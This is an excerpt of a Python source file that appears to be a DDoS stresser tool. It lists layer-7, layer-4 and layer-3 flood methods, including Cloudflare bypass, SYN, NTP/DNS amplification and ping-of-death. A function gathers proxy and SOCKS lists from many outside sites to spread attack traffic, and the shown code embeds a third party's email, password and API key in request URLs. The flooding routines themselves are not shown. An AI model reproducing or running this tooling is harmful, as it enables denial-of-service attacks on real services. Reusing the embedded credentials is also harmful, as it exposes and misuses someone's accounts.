...
l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "TOR", "AVB", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "DNS"]
l3 = ["POD", "ICMP"]
...
def downloadsocks(choice):
    ...
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("http://filefab.com/api.php?l=UsU4AQFoZTvvr2nPDmRNL38fPgzUZ_jajzZ6BOwgDlQ",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://proxy-list.org/english/yourproxylists/limit-999999/a627d180ffd9e2dee243d404e7d458e9.txt",
                timeout=5)
            f.write(r.content)
        except:
            pass
        ...
        try:
            r = requests.get(
                "https://awmproxy.cn/freeproxy_5cf7f736148d132.txt",
                timeout=5)
            f.write(r.content)
        except:
            pass
        ...
        try:
            r = requests.get(
                "http://list.didsoft.com/get?email=erichappy86122@gmail.com&pass=z8aiyj&pid=http6500&showcountry=no",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://proxy-daily.com/api/getproxylist?apikey=FCz46E-pIqWyNvNa-oXvHll&format=ipport&type=http&lastchecked=10",
                timeout=5)
            f.write(r.content)
            f.close()
        except:
    ...
    if choice == "4":
        f = open(out_file, 'wb')
        try:
            r = requests.get("http://filefab.com/api.php?l=kbogJRVrP3w5OQ1mLBedj8O_VN-70WhAVRKv_6WdBPc",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            ...
            pass
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
                timeout=5)
            f.write(r.content)
        except:
            pass
        ...
        try:
            r = requests.get(
                "http://list.didsoft.com/get?email=erichappy86122@gmail.com&pass=z8aiyj&pid=socks8200&showcountry=no&version=socks4",
                timeout=5)
            f.write(r.content)
        except:
            pass
...
if __name__ == '__main__':
    try:
        ...
        try:
            import os
            os.system('pip3 install icmplib requests pysocks cfscrape scapy torpy')
            exit()
        except:
            print('please install python3-pip')
            exit()
    acceptall = [
